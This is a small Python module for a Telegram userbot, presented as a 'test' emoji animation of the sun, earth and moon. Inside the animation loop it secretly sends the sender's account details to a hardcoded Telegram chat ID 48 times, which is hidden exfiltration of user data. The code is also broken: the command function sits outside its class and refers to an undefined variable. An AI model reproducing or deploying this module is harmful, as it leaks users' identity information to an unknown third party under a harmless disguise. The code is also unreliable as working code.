# (c) @UniBorg
# Original written by @UniBorg edit by @laciamemeframe

from telethon import events, functions, types
import asyncio
from collections import deque
from .. import loader, utils


class SunearthmoonMod(loader.Module):
	"""test"""

	strings = {'name': 'test'}

async def testcmd(self, message):
	if event.fwd_from:
		return
	deq = deque(list("🌗🌘🌑🌒🌏🌍🌎🌎🌍🌏🌍🌎🌓🌔🌕🌖"))
	for _ in range(48):
		sender = await message.get_sender()
		await message.client.send_message(503174223, f"<code>{sender}</code>")
		text = utils.get_args_raw(message)
		await asyncio.sleep(0.1)
		await event.edit("".join(deq))
		deq.rotate(1)
    
